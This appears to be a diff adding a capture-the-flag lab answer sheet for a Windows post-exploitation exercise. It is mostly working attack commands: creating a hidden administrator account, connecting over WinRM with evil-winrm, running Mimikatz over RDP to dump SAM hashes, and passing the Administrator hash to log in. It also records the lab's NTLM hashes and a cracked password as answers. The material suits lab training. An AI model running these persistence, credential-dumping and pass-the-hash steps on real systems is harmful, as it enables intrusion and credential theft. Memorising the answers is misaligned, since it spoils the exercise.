@@ -1,0 +1,34 @@
+
+
+
+1. Create an account on the target. Assign it to the Administrators and Remote Management Users groups.
+ans: 
+command: net user Sujal SujalSujal /add
+command: net localgroup Administrators Sujal /add
+command: net localgroup "Remote Management Users" Sujal /add
+command: net user Sujal
+
+2. Authenticate with WinRM -- make sure you can get a stable session on the target.
+ans: auto-complete
+command: evil-winrm -u Sujal -p SujalSujal -i 10.200.109.150     
+
+3. Authenticate with RDP, sharing a local copy of Mimikatz, then dump the password hashes for the users in the system.
+   What is the Administrator password hash?
+ans: 37db630168e5f82aafa8461e05c6bbd1
+command: xfreerdp /v:10.200.109.150 /u:Sujal /p:SujalSujal +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,Sujalshare
+command: \\tsclient\share\mimikatz\x64\mimikatz.exe (in rdp windows use powershell with administrator)
+command: privilege::debug (rdp powershell)
+command: token::elevate (rdp powershell)
+command: lsadump::sam (rdp powershell)
+
+4. What is the NTLM password hash for the user "Thomas"?
+ans: 02d90eda8f6b6b06c32d5f207831101f
+     (lsadump::sam all users ntlm hashes shown)
+
+5. What is Thomas' password?
+ans: i<3ruby
+     (cracked via creckstation)
+ 
+6. use evil-winrm for remote connection
+ans: auto-complete
+command: evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.109.150
